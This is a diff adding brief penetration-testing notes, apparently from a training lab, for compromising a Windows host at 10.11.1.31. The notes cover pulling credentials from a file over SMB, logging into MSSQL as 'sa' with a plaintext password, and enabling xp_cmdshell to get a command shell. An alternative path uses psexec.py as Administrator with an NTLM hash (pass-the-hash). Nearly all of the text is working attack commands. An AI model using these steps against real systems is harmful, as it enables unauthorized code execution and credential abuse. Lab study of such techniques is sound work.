@@ -1,0 +1,19 @@
+connect to smb and get login-off.asp for creds
+
+connect to ms-sql
+
+mssql-cli -S 10.11.1.31 -U sa -P 'poiuytrewq'
+
+EXEC sp_configure 'show advanced options', '1'
+
+RECONFIGURE
+
+EXEC sp_configure 'xp_cmdshell', '1' 
+
+RECONFIGURE
+
+launch mssql_shell.py and get shell
+
+or 
+
+psexec.py Administrator@10.11.1.31 -hashes :f58b86e89c8631e432cf1a034662853f
